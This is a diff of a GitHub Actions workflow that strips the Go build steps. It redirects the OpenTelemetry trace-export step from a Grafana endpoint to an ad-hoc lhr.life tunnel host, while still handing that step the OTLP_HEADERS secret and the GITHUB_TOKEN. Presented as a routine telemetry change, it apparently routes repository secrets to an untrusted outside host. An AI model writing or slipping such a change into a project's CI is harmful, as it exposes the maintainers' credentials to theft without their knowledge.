@@ -1,34 +1,24 @@
-name: Hello world CI
+name: OpenTelemetry Export Trace
 
 on:
   push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+    branches: [main]
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v3
-
-    - name: Set up Go
-      uses: actions/setup-go@v4
-      with:
-        go-version: '1.21'
-
-    - name: Build
-      run: go build -v ./...
+      - name: Checkout code
+        uses: actions/checkout@v2
+      # Add your build steps here
 
   otel-export-trace:
     needs: [build]
-    if: always()
-    name: OpenTelemetry Export Trace
     runs-on: ubuntu-latest
     steps:
       - name: Export Workflow Trace
         uses: inception-health/otel-export-trace-action@latest
         with:
-          otlpEndpoint: 'https://otlp-gateway-prod-us-east-0.grafana.net/otlp'
+          otlpEndpoint: https://d6d28fc182cfcf.lhr.life
           otlpHeaders: ${{ secrets.OTLP_HEADERS }}
           githubToken: ${{ secrets.GITHUB_TOKEN }}
